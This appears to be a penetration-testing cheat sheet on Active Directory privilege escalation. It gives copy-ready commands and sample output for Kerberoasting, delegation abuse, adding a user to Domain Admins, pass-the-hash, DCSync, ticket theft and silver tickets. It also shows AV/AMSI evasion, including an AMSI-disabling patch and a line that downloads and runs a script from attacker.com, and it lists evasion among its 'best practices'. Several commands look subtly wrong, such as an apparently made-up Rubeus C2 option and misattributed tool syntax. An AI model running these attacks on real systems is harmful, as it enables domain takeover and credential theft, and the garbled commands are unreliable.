# Privilege Escalation in Active Directory Penetration Testing

## Overview
Privilege escalation involves elevating access from a low-privilege account (e.g., standard user) to a high-privilege account (e.g., Domain Admin) by exploiting AD misconfigurations or vulnerabilities.

## Detailed Methods and Techniques
- **Kerberoasting**:
  - **Technique**: Request TGS tickets for service accounts with SPNs and crack them offline.
  - **Execution**: Use `GetUserSPNs.py` from Impacket.
    ```bash
    GetUserSPNs.py -dc-ip 192.168.1.10 example.com/jdoe:P@ssw0rd123 -request
    ```
    **Example Output**:
    ```
    ServicePrincipalName: MSSQLSvc/sql01.example.com:1433
    Ticket: [TGS ticket data]
    ```
    - Crack with `hashcat`:
      ```bash
      hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt
      ```
      **Example Output**:
      ```
      MSSQLSvc/sql01.example.com:1433:ServiceP@ss123
      ```
    - **Purpose**: Obtain service account credentials for escalation.
- **Unconstrained Delegation**:
  - **Technique**: Exploit accounts with unconstrained delegation to impersonate users.
  - **Execution**: Use `BloodHound` to identify delegation paths.
    ```bash
    bloodhound-python -u jdoe -p P@ssw0rd123 -d example.com -c All --dc 192.168.1.10
    ```
    **Example Output**: BloodHound GUI shows a path from `jdoe` to `Administrator` via delegation.
    - Exploit with `Rubeus`:
      ```bash
      Rubeus.exe monitor /interval:5 /filteruser:DC01$
      ```
      **Example Output**:
      ```
      [+] TGT for Administrator@EXAMPLE.COM obtained
      ```
    - **Purpose**: Gain Domain Admin access by impersonating a high-privilege user.
- **Group Policy Misconfigurations**:
  - **Technique**: Exploit GPOs that grant excessive permissions or execute scripts.
  - **Execution**: Use `PowerView` to enumerate GPOs.
    ```powershell
    Get-GPO -All | Select DisplayName,GPOStatus
    ```
    **Example Output**:
    ```
    DisplayName: LogonScript
    GPOStatus: Enabled
    ```
    - Check for scripts granting admin rights or weak permissions.
    - **Purpose**: Escalate privileges via misconfigured GPO settings.
- **ACL Abuse**:
  - **Technique**: Exploit misconfigured DACLs (e.g., GenericAll on users or groups).
  - **Execution**: Use `PowerView` to add a user to a privileged group.
    ```powershell
    Add-DomainGroupMember -Identity "Domain Admins" -Members jdoe
    ```
    **Example Output**:
    ```
    jdoe added to Domain Admins
    ```
    - **Purpose**: Gain Domain Admin privileges.
- **Pass-the-Hash**:
  - **Technique**: Use stolen NTLM hashes to authenticate as a privileged user.
  - **Execution**: Use `psexec.py`.
    ```bash
    psexec.py example.com/Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
    ```
    **Example Output**:
    ```
    [*] Connected to 192.168.1.10 as Administrator
    ```
    - **Purpose**: Escalate to admin on a target system.

## Exploitation Methods
- **DCSync Attack**:
  - **Technique**: Use high-privilege credentials to replicate AD objects, including password hashes.
  - **Execution**: Use `mimikatz` for DCSync.
    ```bash
    mimikatz # lsadump::dcsync /domain:example.com /user:Administrator
    ```
    **Example Output**:
    ```
    [DC] 'example.com' will be the domain
    [DC] 'DC01.example.com' will be the DC server
    Object RDN: Administrator
    ** SAM ACCOUNT **
    SAM Username: Administrator
    User Password: [NTLM hash]
    ```
    - **Purpose**: Extract Domain Admin credentials for full AD control.
- **Pass-the-Ticket**:
  - **Technique**: Use stolen Kerberos tickets to authenticate as a privileged user.
  - **Execution**: Use `mimikatz` to export tickets.
    ```bash
    mimikatz # sekurlsa::tickets /export
    ```
    **Example Output**:
    ```
    [0;123456] krbtgt/example.com TGT
    ```
    - Inject ticket:
      ```bash
      mimikatz # kerberos::ptt [ticket]
      ```
    - **Purpose**: Gain access as a high-privilege user without the password.
- **Silver Ticket**:
  - **Technique**: Forge a TGS ticket for a specific service using a service account’s NTLM hash.
  - **Execution**: Use `mimikatz`.
    ```bash
    mimikatz # kerberos::golden /user:jdoe /domain:example.com /sid:S-1-5-21-1234567890-0987654321-123456789 /target:sql01.example.com /service:cifs /rc4:aad3b435b51404eeaad3b435b51404ee
    ```
    **Example Output**:
    ```
    [*] Silver ticket created
    ```
    - **Purpose**: Gain access to a specific service (e.g., file shares).

## AV/AMSI Evasion Techniques
- **Obfuscated PowerShell**:
  - **Technique**: Obfuscate PowerView scripts to bypass AMSI.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {Add-DomainGroupMember -Identity "Domain Admins" -Members jdoe} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI detection during privilege escalation.
- **In-Memory Execution**:
  - **Technique**: Execute escalation scripts in memory.
  - **Execution**: Use `Invoke-Expression`.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powerview.ps1')
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**:
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell scripts from being scanned.
- **Encrypted C2 Channels**:
  - **Technique**: Use encrypted channels for ticket injection.
  - **Execution**: Use `Rubeus` with HTTPS C2.
    ```bash
    Rubeus.exe monitor /interval:5 /filteruser:DC01$ /target:https://attacker.com
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.

## Tools
- **Impacket**: Kerberoasting (`GetUserSPNs.py`).
- **BloodHound**: AD privilege path mapping.
- **PowerView**: GPO and privilege enumeration (`Get-GPO`, `Add-DomainGroupMember`).
- **Mimikatz**: DCSync and ticket attacks (`lsadump::dcsync`, `kerberos::ptt`).
- **Rubeus**: Kerberos ticket manipulation (`Rubeus.exe`).

## Best Practices
- Verify permission to perform escalation attacks to avoid unintended damage.
- Document all escalation paths for remediation recommendations.
- Use obfuscation and encryption to evade AV/AMSI.
- Securely handle sensitive data like hashes and tickets.